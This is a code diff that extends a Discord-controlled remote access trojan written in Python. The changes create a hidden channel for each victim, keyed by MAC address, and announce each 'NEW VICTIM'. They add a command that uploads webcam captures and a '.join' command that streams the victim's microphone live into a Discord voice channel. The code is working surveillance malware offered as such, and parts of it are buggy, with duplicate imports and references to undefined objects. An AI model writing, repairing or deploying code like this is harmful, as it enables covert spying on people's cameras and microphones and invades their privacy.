@@ -11,12 +11,21 @@ import ctypes
 import sys
 from threading import Timer
 from datetime import datetime
+from uuid import getnode as get_mac
+import discord
+import os
+import pyaudio
+import subprocess
+from threading import Timer
+from datetime import datetime
+from uuid import getnode as get_mac
 
-client = discord.Client(intents=discord.Intents.all())
-session_id = os.urandom(6).hex()
+import pyaudio
 
-guild = client.get_guild(int(guild_id))
-channel = guild.create_text_channel(session_id)
+bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
+opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
+discord.opus.load_opus(opuslib_path)
+
 
 commands = "\n".join([
     "help - Help Command",
@@ -32,16 +41,72 @@ commands = "\n".join([
     "start - Add To start",
     "exit - Exit The Session",
 ])
+
+
+
+intents = discord.Intents.all()
+intents.members = True
+client = discord.Client(intents=intents)
+
+async def search_voice_channel(guild, channel_name):
+    for channel in guild.voice_channels:
+        if channel.name == channel_name:
+            return channel
+    
+    return None
+
+async def find_channel_by_name(guild, channel_name):
+    for channel in guild.channels:
+        if channel.name == channel_name:
+            return channel
+    return None
+
+async def create_channels(guild, mac_address):
+    text_channel = await find_channel_by_name(guild, mac_address)
+    voice_channel = await find_channel_by_name(guild, mac_address)
+
+    if text_channel and voice_channel:
+        print("Channels with name {} already exist.".format(mac_address))
+        return text_channel, voice_channel
+
+    overwrites = {
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        guild.me: discord.PermissionOverwrite(read_messages=True)
+    }
+
+    if not text_channel:
+        text_channel = await guild.create_text_channel(mac_address, overwrites=overwrites)
+        print("Text channel with name {} created.".format(mac_address))
+
+    if not voice_channel:
+        voice_channel = await guild.create_voice_channel(mac_address, overwrites=overwrites)
+        print("Voice channel with name {} created.".format(mac_address))
+
+    return text_channel, voice_channel
+
 @client.event
 async def on_ready():
-    await channel.send("clinically online!")
-    
+    guild = client.get_guild(int(guild_id))
+    mac_address = str(get_mac())
+    text_channel, voice_channel = await create_channels(guild, mac_address)
+
+    if text_channel and voice_channel:
+        firstrun = True if text_channel.created_at == voice_channel.created_at else False
+
+        if firstrun:
+            await text_channel.send("Old Victim started the program again.\n @everyone")
+
+        else:
+            await text_channel.send("NEW VICTIM! with the MAC address: {}.\n @everyone".format(mac_address))
+
 @client.event
 async def on_message(message):
+    guild = client.get_guild(int(guild_id))
+    print("MESSAGE SENT WAS:", message.content, "BY :" , message.author,"IN :" , message.channel,)
     if message.author == client.user:
         return
 
-    if message.channel.name != session_id:
+    if message.channel.name != str(get_mac()):
         return
 
     if message.content == "help" or message.content == "Help":
@@ -104,11 +169,12 @@ async def on_message(message):
 
     if message.content.startswith("exit"):
         await message.channel.delete()
+        await voice_channel.channel.delete()
         await client.close()
     
     if message.content == "start":
         await message.reply("Ok Boss")
-        await start()
+
         
     if message.content == "blue" or message.content == "Blue":
         await message.reply("Attempting...", delete_after = .1)
@@ -134,10 +200,40 @@ async def on_message(message):
         webcam = VideoCapture(0, CAP_DSHOW)
         result, image = webcam.read()
         imwrite('webcam.png', image)
-        await message.channel.send(embed=discord.Embed(title=current_time(True) + ' `[On demand]`').set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
+        await message.channel.send(embed=discord.Embed(title=' `[Image of User with ID:' +str(get_mac())+'`]' ).set_image(url='attachment://webcam.png'), file=discord.File('webcam.png'))
         subprocess.run('del webcam.png', shell=True)
         
     if message.content == 'purge':
-        await channel.purge(limit=None)
+        await message.reply('Purging...')
+        await message.channel.purge(limit=None)
+
+    if message.content == '.join':
+            await message.delete()
+            voice_channel = await search_voice_channel(guild, str(get_mac()))
+            if voice_channel:
+                vc = await voice_channel.connect(self_deaf=True)
+                vc.play(discord.PCMVolumeTransformer(PyAudioSource()))
+                await message.channel.send('`[ time ] Joined voice-channel and streaming microphone in realtime`')
+            else:
+                await message.channel.send("Voice channel not found.")
 
 client.run(bot_token)
+
+
+
+# anywhere
+class PyAudioSource(discord.AudioSource):
+    def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
+        self.p = pyaudio.PyAudio()
+        self.chunks = chunk
+        self.input_stream = self.p.open(
+            format=pyaudio.paInt16,
+            channels=channels,
+            rate=rate,
+            input=True,
+            input_device_index=input_device,
+            frames_per_buffer=chunk
+        )
+
+    def read(self) -> bytes:
+        return self.input_stream.read(self.chunks)
